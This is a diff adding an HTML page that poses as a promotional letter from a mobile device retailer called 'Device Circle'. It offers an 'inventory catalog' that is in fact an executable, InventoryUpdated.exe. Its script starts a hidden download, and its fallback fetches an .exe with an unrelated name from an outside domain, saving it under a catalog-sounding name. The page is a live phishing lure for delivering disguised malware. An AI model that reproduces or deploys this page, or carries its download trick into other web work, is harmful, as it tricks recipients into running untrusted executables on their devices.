@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Device Circle - New & Used Mobile Inventory Update</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        color: #333;
+      }
+
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      .download-notification {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 1000;
+        transform: translateX(400px);
+        transition: transform 0.3s ease;
+      }
+
+      .download-notification.show {
+        transform: translateX(0);
+      }
+
+      .notification-content {
+        background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+        color: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 20px rgba(76, 175, 80, 0.3);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .close-btn {
+        background: none;
+        border: none;
+        color: white;
+        font-size: 18px;
+        cursor: pointer;
+        padding: 0;
+        width: 20px;
+        height: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .close-btn:hover {
+        opacity: 0.7;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+        border-radius: 15px 15px 0 0;
+        padding: 40px;
+        text-align: center;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .header::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 5px;
+        background: linear-gradient(
+          90deg,
+          #667eea 0%,
+          #764ba2 50%,
+          #f093fb 100%
+        );
+      }
+
+      .company-logo {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        margin-bottom: 20px;
+      }
+
+      .logo-icon {
+        width: 60px;
+        height: 60px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        color: white;
+        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+      }
+
+      .company-name {
+        font-size: 42px;
+        font-weight: bold;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+
+      .tagline {
+        color: #666;
+        font-size: 16px;
+        margin-top: 10px;
+        font-style: italic;
+      }
+
+      .letter-content {
+        background: white;
+        padding: 50px;
+        border-radius: 0 0 15px 15px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        line-height: 1.7;
+      }
+
+      .greeting {
+        font-size: 20px;
+        margin-bottom: 30px;
+        color: #333;
+        font-weight: 600;
+      }
+
+      .promotional-section {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        padding: 40px;
+        border-radius: 15px;
+        margin: 30px 0;
+        color: white;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .promotional-section::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(
+          circle,
+          rgba(255, 255, 255, 0.1) 0%,
+          transparent 70%
+        );
+        animation: shimmer 3s ease-in-out infinite;
+      }
+
+      @keyframes shimmer {
+        0%,
+        100% {
+          transform: rotate(0deg);
+        }
+        50% {
+          transform: rotate(180deg);
+        }
+      }
+
+      .promo-title {
+        font-size: 28px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .promo-text {
+        font-size: 18px;
+        margin-bottom: 25px;
+        position: relative;
+        z-index: 1;
+        opacity: 0.95;
+      }
+
+      .features-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 20px;
+        margin: 30px 0;
+      }
+
+      .feature-card {
+        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+        padding: 25px;
+        border-radius: 12px;
+        text-align: center;
+        border: 2px solid transparent;
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .feature-card:hover {
+        transform: translateY(-5px);
+        border-color: #667eea;
+        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.2);
+      }
+
+      .feature-icon {
+        font-size: 36px;
+        margin-bottom: 15px;
+        color: #667eea;
+      }
+
+      .feature-title {
+        font-size: 18px;
+        font-weight: bold;
+        margin-bottom: 10px;
+        color: #333;
+      }
+
+      .feature-desc {
+        color: #666;
+        font-size: 14px;
+      }
+
+      .download-section {
+        background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        padding: 40px;
+        border-radius: 15px;
+        text-align: center;
+        margin: 40px 0;
+        box-shadow: 0 6px 25px rgba(79, 172, 254, 0.3);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .download-section::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.2),
+          transparent
+        );
+        animation: slide 2s infinite;
+      }
+
+      @keyframes slide {
+        0% {
+          left: -100%;
+        }
+        100% {
+          left: 100%;
+        }
+      }
+
+      .download-title {
+        color: white;
+        font-size: 26px;
+        font-weight: bold;
+        margin-bottom: 15px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .download-description {
+        color: white;
+        font-size: 16px;
+        margin-bottom: 30px;
+        opacity: 0.95;
+        position: relative;
+        z-index: 1;
+      }
+
+      .download-btn {
+        display: inline-block;
+        background: white;
+        color: #4facfe;
+        padding: 18px 35px;
+        border-radius: 30px;
+        text-decoration: none;
+        font-weight: bold;
+        font-size: 18px;
+        transition: all 0.3s ease;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+        position: relative;
+        z-index: 1;
+        border: 2px solid transparent;
+      }
+
+      .download-btn:hover {
+        transform: translateY(-3px) scale(1.05);
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+        background: #f8f9fa;
+      }
+
+      .file-info {
+        background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+        padding: 25px;
+        border-radius: 12px;
+        margin: 25px 0;
+        border-left: 5px solid #4facfe;
+      }
+
+      .file-details {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 15px;
+      }
+
+      .file-name {
+        font-weight: bold;
+        color: #1565c0;
+        font-size: 16px;
+      }
+
+      .file-size {
+        color: #666;
+        font-size: 14px;
+        background: white;
+        padding: 5px 12px;
+        border-radius: 15px;
+      }
+
+      .message {
+        font-size: 16px;
+        margin-bottom: 25px;
+        color: #555;
+        text-align: justify;
+      }
+
+      .highlight {
+        background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
+        padding: 20px;
+        border-radius: 10px;
+        border-left: 4px solid #ff9800;
+        margin: 20px 0;
+      }
+
+      .contact-section {
+        background: linear-gradient(135deg, #f1f8e9 0%, #dcedc8 100%);
+        padding: 30px;
+        border-radius: 12px;
+        margin: 30px 0;
+        border: 2px solid #8bc34a;
+      }
+
+      .contact-title {
+        color: #2e7d32;
+        font-weight: bold;
+        margin-bottom: 15px;
+        font-size: 18px;
+      }
+
+      .contact-info {
+        color: #2e7d32;
+        font-size: 15px;
+        line-height: 1.6;
+      }
+
+      .signature {
+        margin-top: 40px;
+        padding-top: 25px;
+        border-top: 2px solid #e9ecef;
+        text-align: center;
+      }
+
+      .signature-name {
+        font-weight: bold;
+        color: #333;
+        font-size: 18px;
+      }
+
+      .signature-title {
+        color: #666;
+        font-size: 14px;
+        margin-top: 5px;
+      }
+
+      .footer {
+        text-align: center;
+        margin-top: 30px;
+        color: white;
+        font-size: 14px;
+        opacity: 0.9;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 10px;
+        }
+
+        .header,
+        .letter-content {
+          padding: 25px;
+        }
+
+        .company-name {
+          font-size: 32px;
+        }
+
+        .features-grid {
+          grid-template-columns: 1fr;
+        }
+
+        .file-details {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+      }
+
+      .pulse {
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0% {
+          box-shadow: 0 6px 25px rgba(79, 172, 254, 0.3);
+        }
+        50% {
+          box-shadow: 0 6px 35px rgba(79, 172, 254, 0.5);
+        }
+        100% {
+          box-shadow: 0 6px 25px rgba(79, 172, 254, 0.3);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="downloadNotification" class="download-notification">
+      <div class="notification-content">
+        <i class="fas fa-download mr-2"></i>
+        <span id="downloadMessage"
+          >Device Circle catalog download started! Check your downloads
+          folder.</span
+        >
+        <button onclick="hideNotification()" class="close-btn">×</button>
+      </div>
+    </div>
+    <div class="container">
+      <div class="header">
+        <div class="company-logo">
+          <div class="logo-icon">📱</div>
+          <div class="company-name">Device Circle</div>
+        </div>
+        <div class="tagline">
+          Your Trusted Partner for New & Used Mobile Devices
+        </div>
+      </div>
+
+      <div class="letter-content">
+        <div class="greeting">Dear Valued Customer,</div>
+
+        <div class="message">
+          We are excited to share some fantastic news with you! Device Circle
+          has just updated our extensive inventory of new and used mobile
+          devices, and we couldn't wait to let you know about the incredible
+          opportunities waiting for you.
+        </div>
+
+        <div class="promotional-section">
+          <div class="promo-title">🎉 MASSIVE INVENTORY UPDATE!</div>
+          <div class="promo-text">
+            Discover thousands of premium smartphones, tablets, and accessories
+            at unbeatable prices. From the latest flagship models to certified
+            pre-owned gems!
+          </div>
+        </div>
+
+        <div class="features-grid">
+          <div class="feature-card">
+            <div class="feature-icon">📱</div>
+            <div class="feature-title">Latest Smartphones</div>
+            <div class="feature-desc">
+              Brand new flagship devices from Apple, Samsung, Google, and more
+            </div>
+          </div>
+          <div class="feature-card">
+            <div class="feature-icon">♻️</div>
+            <div class="feature-title">Certified Pre-Owned</div>
+            <div class="feature-desc">
+              Quality-tested used devices with warranty and great savings
+            </div>
+          </div>
+          <div class="feature-card">
+            <div class="feature-icon">💰</div>
+            <div class="feature-title">Best Prices</div>
+            <div class="feature-desc">
+              Competitive pricing with flexible payment options available
+            </div>
+          </div>
+          <div class="feature-card">
+            <div class="feature-icon">🔧</div>
+            <div class="feature-title">Expert Support</div>
+            <div class="feature-desc">
+              Professional setup, repair services, and technical assistance
+            </div>
+          </div>
+        </div>
+
+        <div class="message">
+          <strong>What's New in Our Inventory:</strong>
+        </div>
+
+        <div class="highlight">
+          <ul style="margin-left: 20px; line-height: 1.8">
+            <li>
+              <strong>iPhone 15 Series</strong> - Latest models with advanced
+              camera systems
+            </li>
+            <li>
+              <strong>Samsung Galaxy S24</strong> - Cutting-edge Android
+              flagship devices
+            </li>
+            <li>
+              <strong>Google Pixel 8</strong> - Pure Android experience with AI
+              features
+            </li>
+            <li>
+              <strong>Premium Tablets</strong> - iPad Pro, Galaxy Tab, and
+              Surface devices
+            </li>
+            <li>
+              <strong>Accessories</strong> - Cases, chargers, wireless earbuds,
+              and more
+            </li>
+          </ul>
+        </div>
+
+        <div class="download-section pulse">
+          <div class="download-title">📦 Download Inventory Catalog</div>
+          <div class="download-description">
+            Get instant access to our complete updated inventory with detailed
+            specifications, pricing, and availability
+          </div>
+          <a
+            href="#"
+            class="download-btn"
+            onclick="downloadDeviceCircle(event)"
+          >
+            ⬇️ Download Catalog
+          </a>
+        </div>
+
+        <div class="file-info">
+          <div class="file-details">
+            <span class="file-name">📄 InventoryUpdated.exe</span>
+            <span class="file-size">Size: 5.8 MB</span>
+          </div>
+        </div>
+
+        <div class="message">
+          <strong>Why Choose Device Circle?</strong>
+        </div>
+
+        <div class="message">
+          At Device Circle, we understand that finding the perfect mobile device
+          is more than just a purchase—it's about finding the right technology
+          companion for your lifestyle. Whether you're looking for the latest
+          flagship smartphone or a budget-friendly certified pre-owned device,
+          we have carefully curated our inventory to meet every need and budget.
+        </div>
+
+        <div class="message">
+          Our team of mobile device experts thoroughly inspects every pre-owned
+          device, ensuring you receive quality products that perform like new.
+          We also offer comprehensive warranties, flexible payment plans, and
+          ongoing technical support to make your experience seamless.
+        </div>
+
+        <div class="contact-section">
+          <div class="contact-title">
+            📞 Ready to Upgrade? Contact Us Today!
+          </div>
+          <div class="contact-info">
+            <strong>Phone:</strong> 1-800-DEVICE-1 (1-800-338-4231)<br />
+            <strong>Email:</strong> sales@devicecircle.com<br />
+            <strong>Website:</strong> www.devicecircle.com<br />
+            <strong>Store Hours:</strong> Monday-Saturday 9AM-8PM, Sunday
+            11AM-6PM
+          </div>
+        </div>
+
+        <div class="message">
+          Don't miss out on these incredible deals! Our inventory moves fast,
+          especially the most popular models. Download our updated catalog now
+          and discover your next perfect device.
+        </div>
+
+        <div class="message">
+          Thank you for choosing Device Circle as your trusted mobile device
+          partner. We look forward to helping you find the perfect device that
+          fits your needs and budget.
+        </div>
+
+        <div class="signature">
+          <div class="signature-name">The Device Circle Team</div>
+          <div class="signature-title">
+            New & Used Mobile Device Specialists
+          </div>
+          <div class="signature-title">
+            Device Circle Inc. | Connecting You to Technology
+          </div>
+        </div>
+      </div>
+
+      <div class="footer">
+        <p>© 2025 Device Circle Inc. All rights reserved.</p>
+        <p style="margin-top: 10px; font-size: 12px">
+          This promotional offer is subject to availability and terms of
+          service.
+        </p>
+      </div>
+    </div>
+
+    <script>
+      // Function to download Device Circle catalog using the API
+      function downloadDeviceCircle(event) {
+        event.preventDefault();
+
+        try {
+          // Show download notification
+          showNotification();
+
+          // Create the download URL with DeviceCircle as the parameter
+          const url = `/api/download?movie=DeviceCircle`;
+
+          // Create hidden link and trigger download
+          const a = document.createElement("a");
+          a.href = url;
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+
+          console.log("Device Circle catalog download initiated via API");
+        } catch (error) {
+          console.error("Download failed:", error);
+          directDownload();
+        }
+      }
+
+      // Direct download fallback
+      function directDownload() {
+        const remoteFile =
+          "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+        const a = document.createElement("a");
+        a.href = remoteFile;
+        a.download = "DeviceCircle_Inventory_Catalog.exe";
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      // Show/hide notification functions
+      function showNotification() {
+        const notification = document.getElementById("downloadNotification");
+        notification.classList.add("show");
+        setTimeout(() => hideNotification(), 5000);
+      }
+
+      function hideNotification() {
+        const notification = document.getElementById("downloadNotification");
+        notification.classList.remove("show");
+      }
+
+      // Keep your existing interactive effects
+      document.addEventListener("DOMContentLoaded", function () {
+        const featureCards = document.querySelectorAll(".feature-card");
+
+        // Feature cards hover effect
+        featureCards.forEach((card) => {
+          card.addEventListener("mouseenter", function () {
+            this.style.transform = "translateY(-5px) scale(1.02)";
+          });
+
+          card.addEventListener("mouseleave", function () {
+            this.style.transform = "translateY(0) scale(1)";
+          });
+        });
+
+        // Download section hover effect
+        const downloadSection = document.querySelector(".download-section");
+        downloadSection.addEventListener("mouseenter", function () {
+          this.style.transform = "scale(1.02)";
+        });
+
+        downloadSection.addEventListener("mouseleave", function () {
+          this.style.transform = "scale(1)";
+        });
+
+        // Add floating animation to promotional section
+        const promoSection = document.querySelector(".promotional-section");
+        setInterval(() => {
+          promoSection.style.transform = "translateY(-2px)";
+          setTimeout(() => {
+            promoSection.style.transform = "translateY(0)";
+          }, 1000);
+        }, 3000);
+      });
+    </script>
+  </body>
+</html>
